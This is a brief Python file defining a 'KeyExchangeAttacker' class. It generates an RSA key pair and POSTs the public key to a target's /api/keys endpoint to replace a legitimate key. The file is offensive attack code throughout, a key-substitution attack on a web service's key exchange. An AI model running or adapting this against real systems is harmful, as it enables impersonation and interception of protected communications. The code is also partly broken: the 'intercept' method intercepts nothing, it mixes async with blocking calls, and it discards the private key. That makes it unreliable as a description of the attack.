import requests
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

class KeyExchangeAttacker:
    def __init__(self):
        self.generated_keys = {}
        
    def generate_malicious_keypair(self):
        """Generate malicious RSA key pair"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        public_key = private_key.public_key()
        return private_key, public_key

    async def intercept_key_exchange(self, target_url):
        """Intercept and replace key exchange"""
        private_key, public_key = self.generate_malicious_keypair()
        
        # Serialize public key for transmission
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        # Replace legitimate key with malicious key
        headers = {'Content-Type': 'application/json'}
        response = requests.post(
            f"{target_url}/api/keys",
            json={'key': base64.b64encode(pem).decode()},
            headers=headers
        )
        return response.status_code == 200